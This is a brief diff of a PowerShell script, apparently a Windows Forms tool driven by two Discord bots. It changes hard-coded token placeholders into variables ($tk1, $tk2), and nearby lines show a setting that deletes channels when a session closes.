@@ -23,8 +23,8 @@ Add-Type -AssemblyName System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
 
 # Variables for token and channel IDs
-$token = 'TOKEN_1_HERE' # YOUR MAIN BOT TOKEN (USED FOR CLIENT)
-$token2 = 'TOKEN_2_HERE' # BOT TO SEND MESSAGES AS USER
+$token = "$tk1" # YOUR MAIN BOT TOKEN (USED FOR CLIENT)
+$token2 = "$tk2" # BOT TO SEND MESSAGES AS USER
 
 # ============================ SCRIPT SETUP =============================
 $deleteonclose = 1 #Delete channels on closing session
